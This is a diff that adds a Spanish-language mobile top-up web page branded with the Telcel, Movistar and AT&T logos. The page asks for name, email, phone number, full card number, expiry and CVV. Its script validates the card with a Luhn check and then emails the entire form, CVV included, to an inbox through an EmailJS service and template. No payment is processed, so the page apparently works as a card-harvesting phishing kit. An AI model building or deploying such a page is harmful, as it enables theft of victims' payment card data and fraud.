@@ -1,1 +1,157 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Recarga Móvil</title>
+<style>
+:root{
+  --bg:#f9fafb; --card:#ffffff; --muted:#6b7280; --text:#111827;
+  --accent:#2563eb; --danger:#ef4444; --radius:14px;
+}
+*{box-sizing:border-box;}
+body{margin:0;font-family:system-ui, sans-serif;background:var(--bg);color:var(--text);}
+.container{max-width:600px;margin:0 auto;padding:24px;}
+h1{font-size:clamp(22px,3vw,28px);margin:0 0 16px;}
+.subtitle{color:var(--muted);margin:0 0 20px;font-size:14px;}
+.card{background:var(--card);border-radius:var(--radius);padding:20px;box-shadow:0 8px 24px rgba(0,0,0,0.08);}
+label{display:block;font-size:13px;color:var(--muted);margin:12px 0 6px;}
+input,select{width:100%;padding:12px 14px;border-radius:12px;border:1px solid #d1d5db;background:#fff;outline:none;}
+input:focus,select:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(37,99,235,0.3);}
+.btn{width:100%;padding:14px 18px;border-radius:12px;border:0;cursor:pointer;background:linear-gradient(90deg,#2563eb,#3b82f6);color:#fff;font-weight:700;text-transform:uppercase;}
+.btn:disabled{opacity:.5;cursor:not-allowed;}
+.error-msg{display:none;margin-top:12px;padding:10px 14px;border-radius:8px;font-size:14px;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.4);color:var(--danger);}
+#summary{display:none;margin-top:20px;padding:14px;border-radius:12px;background:#ecfdf5;border:1px solid #22c55e;}
+#summary img{height:40px;vertical-align:middle;margin-right:10px;}
+
+/* operadores en tarjetas */
+.operators{display:flex;gap:16px;margin:12px 0;}
+.operator-card{flex:1;cursor:pointer;border:2px solid transparent;border-radius:12px;padding:10px;text-align:center;background:#fff;transition:.2s;}
+.operator-card img{height:50px;object-fit:contain;}
+.operator-card.active{border-color:var(--accent);box-shadow:0 0 0 3px rgba(37,99,235,0.2);}
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>Recarga tu móvil</h1>
+  <p class="subtitle">Selecciona operador, el monto y completa tus datos de pago.</p>
+
+  <form id="rechargeForm" novalidate>
+    <div class="card">
+      <label>Selecciona tu operador</label>
+      <div class="operators">
+        <div class="operator-card" data-value="Telcel" data-logo="https://upload.wikimedia.org/wikipedia/commons/5/5c/Telcel_logo.png">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/5/5c/Telcel_logo.png" alt="Telcel">
+        </div>
+        <div class="operator-card" data-value="Movistar" data-logo="https://upload.wikimedia.org/wikipedia/commons/6/65/Movistar_logo.svg">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/6/65/Movistar_logo.svg" alt="Movistar">
+        </div>
+        <div class="operator-card" data-value="AT&T" data-logo="https://upload.wikimedia.org/wikipedia/commons/f/f9/AT%26T_logo_2016.svg">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/AT%26T_logo_2016.svg" alt="AT&T">
+        </div>
+      </div>
+      <input type="hidden" id="operator" name="operator">
+
+      <label for="amount">Monto de recarga</label>
+      <select id="amount" name="amount" required>
+        <option value="">Selecciona</option>
+        <option value="50">$50</option>
+        <option value="100">$100</option>
+        <option value="200">$200</option>
+        <option value="500">$500</option>
+      </select>
+
+      <label for="name">Nombre completo</label>
+      <input id="name" name="name" required placeholder="Tu nombre completo">
+
+      <label for="email">Correo electrónico</label>
+      <input id="email" name="email" type="email" required placeholder="correo@ejemplo.com">
+
+      <label for="mobile">Número a recargar</label>
+      <input id="mobile" name="mobile" required placeholder="Ej: 5523456789">
+
+      <hr style="margin:20px 0;border:0;border-top:1px solid #e5e7eb;">
+
+      <label for="cardNumber">Número de tarjeta</label>
+      <input id="cardNumber" name="cardNumber" required placeholder="•••• •••• •••• ••••">
+
+      <label for="cardExp">Vencimiento (MM/AA)</label>
+      <input id="cardExp" name="cardExp" required placeholder="MM/AA">
+
+      <label for="cardCvv">CVV</label>
+      <input id="cardCvv" name="cardCvv" required placeholder="CVV">
+    </div>
+
+    <div id="summary"></div>
+
+    <button class="btn" type="submit">Realizar Recarga</button>
+    <div class="error-msg" id="errorMsg">❌ Completa todos los campos correctamente.</div>
+  </form>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+emailjs.init("TU_PUBLIC_KEY"); // reemplaza con tu public key
+
+const operatorCards = document.querySelectorAll(".operator-card");
+const operatorInput = document.getElementById("operator");
+let selectedLogo = "";
+
+operatorCards.forEach(card=>{
+  card.addEventListener("click",()=>{
+    operatorCards.forEach(c=>c.classList.remove("active"));
+    card.classList.add("active");
+    operatorInput.value = card.dataset.value;
+    selectedLogo = card.dataset.logo;
+  });
+});
+
+function formatCardNumber(v){
+  return v.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim();
+}
+function validateLuhn(num){
+  const arr=num.replace(/\s/g,'').split('').reverse().map(x=>+x);
+  const sum=arr.reduce((a,v,i)=>a+(i%2?((v*2>9)?v*2-9:v*2):v),0);
+  return sum%10===0;
+}
+
+document.getElementById("cardNumber").addEventListener("input",e=>{
+  e.target.value=formatCardNumber(e.target.value);
+});
+document.getElementById("cardExp").addEventListener("input",e=>{
+  let v=e.target.value.replace(/\D/g,'');
+  if(v.length>2) v=v.slice(0,2)+"/"+v.slice(2,4);
+  e.target.value=v;
+});
+
+const form=document.getElementById("rechargeForm");
+form.addEventListener("submit",e=>{
+  e.preventDefault();
+  const fields=["operator","amount","name","email","mobile","cardNumber","cardExp","cardCvv"];
+  let valid=true;
+  fields.forEach(f=>{
+    const el=document.getElementById(f);
+    if(!el.value.trim()) valid=false;
+  });
+  const cardNum=document.getElementById("cardNumber").value;
+  if(!validateLuhn(cardNum)) valid=false;
+
+  if(!valid){document.getElementById("errorMsg").style.display="block";return;}
+  document.getElementById("errorMsg").style.display="none";
+
+  const operator=operatorInput.value;
+  const amount=document.getElementById("amount").value;
+  const mobile=document.getElementById("mobile").value;
+  const summary=document.getElementById("summary");
+  summary.innerHTML=`<strong>Resumen:</strong><br>
+    <img src="${selectedLogo}" height="40"> ${operator} - $${amount} a ${mobile}`;
+  summary.style.display="block";
+
+  emailjs.sendForm("service_tc4q92e","template_qdvkqdr",form)
+  .then(()=>{alert("✅ Datos enviados correctamente");form.reset();operatorCards.forEach(c=>c.classList.remove("active"));summary.style.display="none";})
+  .catch(()=>alert("❌ Error al enviar"));
+});
+</script>
+</body>
+</html>
 
